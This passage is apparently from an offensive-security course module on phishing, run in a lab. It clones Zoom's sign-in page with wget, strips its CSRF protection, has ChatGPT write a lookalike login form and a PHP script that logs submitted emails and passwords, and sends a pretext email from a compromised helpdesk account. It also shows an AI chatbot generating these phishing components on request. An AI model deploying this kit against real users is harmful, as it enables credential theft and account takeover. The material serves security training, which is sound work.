In Listing 4, we'll use `-E` to change the file extension to match the MIME type of the downloaded file. We'll convert all the links in the document to point to local alternatives with `-k` and use `-K` to save the original file with a `.orig` extension. Next, we'll use `-p` to download all the files necessary for viewing the specific page. The `-e robots=off` will ignore **robots.txt** directives which might otherwise hinder our download. We'll download all files from external hosts with `-H`, limited to files on the **zoom.us** domain with `-Dzoom.us`. Finally, we will use `-nd` save all files in a flat directory structure in our current working directory.

Let's run the command now.

```
kali@kali:~/ZoomSignin$ wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"

> Listing 5 - Checking which files were downloaded by `wget`.

This command downloaded 5,908 files! This seems like a lot of files, but for now we'll assume these are all the files we need to create a real clone of this page. Let's set up an HTTP server to see how these render in our browser.

We'll use the Python `http.server` module to serve the contents of the **ZoomSignin** on port 80 of our local machine.

```
kali@kali:~/ZoomSignin$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's browse the server.

![[OffSec/OSCP/z. images/3ef8adf39e1edccd101c6ac8b87d82a1_MD5.jpg]]

Figure 5: OWASP CSRFGuard error alert

This presents an OWASP CSRF Guard error alert box. This is somewhat expected since we tried to load externally-hosted JavaScript. We'll note this for now and click through the alert.

Next, we're presented with a cookie modal, and in the background, we see a clone of the official page.

![[OffSec/OSCP/z. images/2fe524468dbce769d2001a2c59a53b11_MD5.jpg]]

Figure 6: A cookie acceptance modal

The cookie modal is a very important detail which makes our site look more convincing. After all, most sites present these (admittedly annoying) modals.

Let's click *Accept Cookies* to make sure nothing breaks. Once we do, we're presented with the full web page, which looks extremely convincing.

![[OffSec/OSCP/z. images/d5ff15859356ce598066d6565ce1eeef_MD5.jpg]]

Figure 7: The cloned page after clicking through the alert and modal

Now that we have a cloned page that looks and responds like the original, our next step is to enter a fake email address and password so we can see what happens if we attempt to sign in.

After clicking *Sign In*, the page grays out and presents a spinning wheel. Nothing else happens.

![[OffSec/OSCP/z. images/c45893a22c671176231a6999cc4749a8_MD5.jpg]]

Figure 8: Infinite spinning wheel

Let's inspect the output of our Python3 *http.server* to figure out what's going on.

```

> Listing 6 - POST request made to the `/sendUserBehavior` endpoint.

The output includes a POST request to **sendUserBehavior**, which our Python3 `http.server` rejected with a 501 error. This is great information, revealing that we can create an endpoint at **/sendUserBehavior** as part of our malicious site, which will accept the POST request. We could then log the request, which should contain the credentials we are trying to steal.

#### Labs

1. Using your Kali VM try to clone the Zoom login page. What `wget` flag do we need to supply to save everything as a flat structure rather than having various subdirectories?

Answer

## 11.3.3. Cleaning Up the Clone

We have a few things we need to do before our phishing page is ready for prime time. The first thing we should do is remove the OWASP CSRFGuard code, which presented an alert box when we first loaded the page.

Let's search the files in our directory for "OWASP" to try to find the alert text.

```
kali@kali:~/ZoomSignin$ grep "OWASP" *
csrf_js: * The OWASP CSRFGuard Project, BSD License
csrf_js: *    3. Neither the name of OWASP nor the names of its contributors may be used
csrf_js:                    this.setRequestHeader("X-Requested-With", "OWASP CSRFGuard Project");
csrf_js:        alert("OWASP CSRFGuard JavaScript was included from within an unauthorized domain!");
```

> Listing 7 - Finding the file which contains the OWASP CSRFGuard code

It seems the warning is in the **csrf\_js** file. Let's find the web page that includes this file.

```
kali@kali:~/ZoomSignin$ grep "csrf_js" *
csrf_js:        xhr.open("POST", "/csrf_js"+(typeof(resourceAccountIdRoutingURl)!="undefined"?"?"+resourceAccountIdRoutingURl:""), false);
csrf_js:            xhr.open("POST", "/csrf_js"+(typeof(resourceAccountIdRoutingURl)!="undefined"?"?"+resourceAccountIdRoutingURl:""), false);
signin.html:<script nonce="Sxwi1J4PRJSzTs4fu1bzvQ" src="csrf_js"></script>
signin.orig:<script nonce="Sxwi1J4PRJSzTs4fu1bzvQ" src="/csrf_js"></script>
```

> Listing 8 - Finding which HTML page uses the **csrf\_js** file

The file name appears in several places, however, we're most interested in the main **signin.html** page.

Let's delete this line from the **signin.html** page, save the file and reload the page. The CSRFGuard alert box is no longer displayed. This is a good start.

![[OffSec/OSCP/z. images/2fe524468dbce769d2001a2c59a53b11_MD5.jpg]]

Figure 6: Avoiding the OWASP CSRFGuard error alert

Before we wrap up, it's worth mentioning that we should check the HTML code for any other files imported from **zoom.us** because each of these requests will hit the Zoom servers. We want to minimize these requests as they could raise suspicion and increase the visibility of our phishing efforts. Overall, this will help us remain as stealthy as possible. We'll skip this step for now.

#### Labs

1. What is the name of the file containing the code which triggers the OWASP CSRFGuard warning?

Answer

## 11.3.4. Injecting Malicious Elements in the Clone

Now that we've taken care of the OWASP warning, let's focus on retrieving the submitted credentials.

First, let's move our phishing page to a proper web server which has better support for our POST requests. Before starting up another server, we'll kill our Python3 `http.server` process by hitting C+c.

```
kali@kali:~/ZoomSignin$ mv -f * /var/www/html
kali@kali:~/ZoomSignin$ systemctl start apache2
kali@kali:~/ZoomSignin$ cd /var/www/html
```

> Listing 9 - Moving the files to the Apache2 web root

We could try editing the existing login form to intercept the credentials, but this would mean sifting through code to figure out how the existing code works. Let's instead try to get an LLM to write us our own form and overwrite it in **signin.html**.

Let's make a copy of the current page so we can compare the original with our modified version.

```
kali@kali:~/ZoomSignin$ cp -f signin.html signin_orig.html
```

> Listing 10 - Saving the original version of the page for later comparison

Next, let's find the existing form. In Firefox, let's navigate to Application Menu > More Tools > Web Developer Tools.

From here, let's hover over various parts of the code to highlight various elements.

![[OffSec/OSCP/z. images/5577b987bee1acd26606a6795c000aba_MD5.jpg]]

Figure 9: Finding out the code responsible for the form

We'll eventually find that the form is enclosed in a *div* element with an *id* attribute named "app". This `<div>` element includes a header and two nested `<div>` tags that control the image display on the left side of the webpage and the login form placement on the right side. This is a good starting point, however, we're only seeing the outermost `<div>` tag in the `signin.html` file:

```
<div id="nested" class="zoom-newpd">
<div class="mini-layout" role="main" aria-label="main content">
<div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
<div id="app"></div>
</div>
```

> Listing 11 - Finding only the *div* with the "app" *id*

This is likely because that code is dynamically generated. We could trace this dynamic code, but that will only slow us down. After all, we're going to replace this code with LLM-generated code.

Let's copy as much as possible from the original page. We know that the *div* has a header inside which we can most likely copy from within the developer tools by right-clicking on the *header* element and selecting the *Copy* followed by *OUTER HTML*.

Figure 10: Copying the header

Next, let's change the *id* of the *div* inside the **signin.html**, to avoid using the dynamically generated code, page and paste the output for the header.

```

> Listing 12 - Adding the *header* to our new *div*

Let's save the changes and reload the web page. There are some issues. The login form and main images are gone, and although the header is working, the Zoom logo is larger than it was on the original page. It also seems like we need to move the logo a bit to the right.

Tip

Note that ChatGPT's responses will vary. It may even return broken code. In some cases, we may have to change our prompts and guide the LLM to get the results we want.

Let's ask ChatGPT to fix this for us:

```
Shrink the image and move it a bit to the right and lower in the following code:

> Listing 13 - Asking ChatGPT to resize the image in the header and position it correctly

After entering the prompt, ChatGPT not only rewrites the entire code in a much more readable way but provides us with inline CSS that allows us to resize the image and position it properly:

The output is much cleaner once we update the code in **signin.html** and refresh the page.

Figure 12: Modifying the header with the help of ChatGPT

Unfortunately, we're still missing the left-hand image and the login form. Let's find the image URL with the *Web Developer Tools*.

![[OffSec/OSCP/z. images/54c58d20f826c1b0ba97315e21a622b8_MD5.jpg]]

Figure 13: Finding the image URL

We can right-click the image and select Inspect. The URL should be displayed on the Inspector tab. Now that we've gathered all the information we need, let's ask ChatGPT to add both the image and the form.

```
Write two div tags, one should be positioned to the left and contain this image https://file-paa.zoom.us/pdsPbE6oTFKfbq5oURZKOg/MS4yLtzjkdUbexHaODh364Qf2acyHTNZdu_DEytqRdT7SqgP/af0a13c9-d164-4490-8e1e-53864cdfb130.png 

The second div tag should be a login form that looks like the Zoom one from the Sign In page https://zoom.us/signin#/login

Make the email and password be sent to the "custom_login.php" page once someone clicks on the "Sign In" button
```

> Listing 15 - Asking ChatGPT to create the missing elements from the original page

Let's insert this code after the *header* tag inside our **signin.html** page.

```

Figure 14: Updating our page to include the two div's generated by ChatGPT

This is looking pretty good, but there are a few things we need to nudge. Let's ask ChatGPT to fix a few things for us:

```
Modify the code above and do the following: 
- Move the image more to the top and right.
- Adjust the form to not overlap with the image. 
- The official Zoom Sign In page has a "Help" link right next to the "Forgot Password?" one, add that too. 
- Below the "Sign In" button add the text "By signing in, I agree to the Zoom's Privacy Statement and Terms of Service." and make "Zoom's Privacy Zoom's Privacy" and "Terms of Service" links that point to the official web pages. 
- Below this make a checkbox with the text "Stay signed in" next to it. 
- Below this add the "Zoom is protected by reCAPTCHA and the Privacy Policy and Terms of Service apply." text and make sure that "Privacy Policy" and "Terms of Service" are hyperlinks that  point to the official resources
```

With all the code changes in place, we now have a lookalike Zoom login page that's pretty convincing. This was relatively easy to do with the help of ChatGPT.

There are still some things we could tweak, like matching the original fonts, and although ChatGPT could help with this, we'll move on with this example. In a real-world campaign, we may want to invest more time in this, but we always want to keep a good balance and avoid reaching the point of diminishing returns.

Next, we'll get ChatGPT's help with **custom\_login.php**, which handles the POST requests and the email and password we're hoping to capture.

```
Help me write the custom_login.php file, it should first capture the email and password and then write them to a file called "credentials.txt" without overwriting an existing file or its content. 

After it should redirect the user to the official zoom page  https://zoom.us/signin#/login
```

> Listing 19 - Requesting the code for the custom\_login.php file

ChatGPT quickly generates this code:

```
<?php
// Check if the form fields 'email' and 'password' are set
if (isset($_POST['email']) && isset($_POST['password'])) {
    // Get the email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Define the file path to store the credentials
    $file = 'credentials.txt';

    // Prepare the data to write (append mode)
    $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Use file_put_contents to write to the file and create it if it doesn’t exist
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
        echo "Error writing to file.";
        exit();
    }

    // Redirect the user to the official Zoom sign in page
    header('Location: https://zoom.us/signin#/login');
    exit();
} else {
    // If the form is not submitted correctly, output an error message
    echo "Please ensure both email and password are provided.";
}
?>
```

> Listing 20 - The code provided by ChatGPT for our custom\_login.php file

Let's update the code in **custom\_login.php**, create the **credentials.txt** file and apply appropriate permissions.

```
kali@kali:~/var/www/html$ sudo echo "" > credentials.txt
kali@kali:~/var/www/html$ sudo chmod 777 custom_login.php
kali@kali:~/var/www/html$ sudo chmod 777 credentials.txt
```

> Listing 21 - Create the **credentials.txt** and set permissions appropriately

With everything in place, let's test the code by inputting some fake credentials.

Figure 16: Updating our page to include the modifications asked from ChatGPT

After inputting the credentials, we'll click *Sign In*, at which point we are redirected to the actual Zoom website. Let's see if we captured the credentials.

```
kali@kali:~/var/www/html$ cat credentials.txt

Email: test@test.com
Password: test
```

> Listing 22 - Capturing the credentials

Excellent! We've cloned the website and with the help of ChatGPT, we've modified the code to harvest credentials. Next, we'll turn our attention to the compromised helpdesk account and use it to send our phishing email.

#### Labs

1. What is the *id* of the main div containing the main image and login form on the Zoom clone? (don't include anything before the '=')

Answer

2. In the code from Listing 14, ChatGPT uses inline styles to modify the header logo. What style property sets the size of the top margin?

## 11.3.5. Crafting the Phishing email

Now that our lookalike Zoom site is ready, we can return to our compromised helpdesk account and send the internal phishing email.

Info

We will need to replace the `X` in the website address with the IP address in the *Resource* section.

Let's access the webmail portal at **http://192.168.X.77/mail/** on *MAILER*.

When we open the webpage, we get a message about "Warning: Potential Security Risk Ahead."

![[OffSec/OSCP/z. images/47c1c69844a9a9af8861836a7db60b8a_MD5.jpg]]

Figure 17: Add Exception for website

Here we click *Advanced* and then *Accept the Risk and Continue*.

![[OffSec/OSCP/z. images/41d137b9531aeffdcc5d6a76f51144ef_MD5.jpg]]

Figure 18: Login page

We'll log in as **helpdesk@mail.corp.com** with a password of *Helpdesk@Password2024*. We'll check the *Sent* emails, find the email we're interested in and click *Reply to sender and all recipients*.

![[OffSec/OSCP/z. images/18778953721b7041fc05d48c828d2a09_MD5.jpg]]

Figure 19: Reply to sender and all recipients

We'll add the email text that ChatGPT generated, which mimics the communication style from the official Helpdesk account.

```
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder—hope everything’s going smoothly on your end! We’re still working on updating our Zoom license inventory and noticed that some accounts haven’t yet logged in to schedule a meeting. To make sure your account remains on a full license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.

Best regards,
CORP.COM Helpdesk Team
```

> Listing 23 - The text generated by ChatGPT in response to our prompt.

We'll add a hyperlink to the text to redirect users to our cloned website. We'll do this in HTML mode:

![[OffSec/OSCP/z. images/434a4dcc2965df5d8794c3de3f7d0fbe_MD5.jpg]]

Figure 20: Switch to HTML mode

With the HTML editor open, we'll paste our malicious URL as a hyperlink.

![[OffSec/OSCP/z. images/cb519e01b91e991da8e2ef5165ee48aa_MD5.jpg]]

Figure 21: Adding a hyperlink to our malicious website

Tip

Due to DNS limitations in the labs, we won't use a FQDN for our phishing link. However, in a normal phishing scenario, we would host our malicious page on a name that matched the look of our Zoom pretext.

Finally, we'll send the email. At this point in a real-world scenario, we would begin our potentially long and nerve-wracking wait, hoping that our target responds to our phish. For the purposes of this module, we'll assume the role of a victim. Let's log in as *j.smith.sales@mail.corp.com* with a password of *W00tw00t!!*.

After logging in, we'll click the malicious link and enter our fictitious Zoom credentials.

Caution

Please note that for the purpose of the module we're not using an actual Zoom account, you will not be able to use the credentials in this module to login to a Zoom account.

Let's check the **credentials.txt** file on our Kali machine:

```
kali@kali:~/var/www/html$ cat credentials.txt

Email: test@test.com
Password: test

Email: j.smith.sales@corp.com
Password: W00tw00t!!
```

> Listing 24 - Capturing the credentials for the **j.smith.sales@mail.corp.com** account

Excellent! We captured the credentials! We could now attempt to use this information to further our campaign or expand our attack.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing Basics - Crafting the Phishing email - VM #1

#### Labs

1. Browse to the Webmail application at **http://192.168.X.77/mail/**, using your IP for VM #1. Log in as **helpdesk@mail.corp.com** account and send the newly-crafted phishing email. Make sure that you add a hyperlink and make it point to your cloned Zoom website. After, login to the Webmail using the **j.smith.sales@mail.corp.com** username with the **W00tw00t!!** password and click the hyperlink. Input **j.smith.sales@mail.corp.com** as the email and a fake password and click the "Sign In" button. Ensure that the credentials are captured inside the **credentials.txt** file. If we wanted to change the file where the credentials are saved to **passwords.txt** how would the update PHP line look like?

## 11.4. Wrapping Up

Phishing is as much an art as it is a technical exercise. It requires a solid understanding of human behavior, meticulous research, and precise execution. From crafting convincing pretexts to leveraging modern tools like Gen AI and deepfakes, attackers have an expanding arsenal at their disposal.

By outlining the components and requirements of a successful phishing campaign and recreating them in a controlled environment, we’ve built a practical foundation for understanding phishing campaigns. This knowledge equips us to better anticipate, leverage, and counter these threats effectively.
